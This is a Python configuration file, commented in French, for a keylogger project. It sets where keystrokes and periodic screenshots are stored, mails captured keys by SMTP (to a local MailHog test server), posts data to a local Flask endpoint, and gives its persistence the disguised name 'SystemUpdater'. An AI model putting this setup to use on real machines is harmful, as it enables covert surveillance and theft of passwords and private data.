# ============================================================
#  config.py — Configuration globale du projet
#  Toutes les constantes sont ici — on ne touche qu'à ce fichier
#  pour modifier le comportement du programme
# ============================================================

import os

# ── CHEMINS ──────────────────────────────────────────────────
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DB_PATH     = os.path.join(BASE_DIR, "storage", "keylog.db")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "storage", "screenshots")

# ── LISTENER ─────────────────────────────────────────────────
BUFFER_SIZE = 20          # Frappes accumulées avant flush en DB

# ── MAILER (SMTP) ─────────────────────────────────────────────
SMTP_SERVER    = "localhost"        # MailHog local pour les tests
SMTP_PORT      = 1025               # Port MailHog — Gmail : 587
EMAIL_FROM     = "keylogger@test.com"
EMAIL_TO       = "moi@test.com"
EMAIL_PASSWORD = ""                 # Vide pour MailHog
SEND_INTERVAL  = 600                # Secondes entre chaque envoi (600 = 10 min)
MAX_KEYS_EMAIL = 100                # Nb max de frappes par email

# ── HTTP SENDER ───────────────────────────────────────────────
HTTP_SERVER_URL = "http://localhost:5000/receive"  # Serveur Flask local
HTTP_INTERVAL   = 300               # Secondes entre chaque envoi HTTP

# ── SCREENSHOT ────────────────────────────────────────────────
SCREENSHOT_INTERVAL = 60            # Capture toutes les 60 secondes

# ── PERSISTENCE ───────────────────────────────────────────────
APP_NAME    = "SystemUpdater"       # Nom de la clé registre / entrée cron